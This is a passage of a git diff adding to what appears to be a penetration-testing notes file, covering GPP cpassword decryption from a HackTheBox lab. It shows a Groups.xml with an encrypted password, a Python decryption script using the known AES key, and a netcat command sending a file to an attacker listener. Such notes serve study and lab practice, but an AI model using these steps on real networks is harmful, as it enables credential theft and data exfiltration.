@@ -63,3 +63,41 @@ PS C:\temp> cmd /c "nc64.exe 192.168.174.245 4444 < C:\Scheduler\scheduler.exe"
 # Linux
 nc -lnvp 4444 > scheduler.exe
 ```
+
+
+# 🔹Groups.xml
+`Groups.xml` Likely in found `SYSVOL` folder, or `machines/preferences/group` or `/preferences/group`
+```
+<?xml version="1.0" encoding="utf-8"?>
+<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
+</Groups>
+```
+We can crack the cpassword with the following python script `ggp-decrypt.py`
+```
+#!/usr/bin/env python3
+
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import unpad
+import base64
+
+if __name__ == "__main__":
+    key = b"\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b"
+    iv = b"\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+
+    # CHANGE THIS CIPHER TEXT
+    ciphertext = "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ=="
+    ciphertext = base64.b64decode(ciphertext)
+
+    plaintext = cipher.decrypt(ciphertext)
+    plaintext = unpad(plaintext, AES.block_size)
+
+    print(plaintext.decode())
+```
+To use the script do the following
+```
+python3 -m venv venv
+. venv/bin/activate
+pip3 install pycryptodome
+python3 gpp-decrypt.py
+```
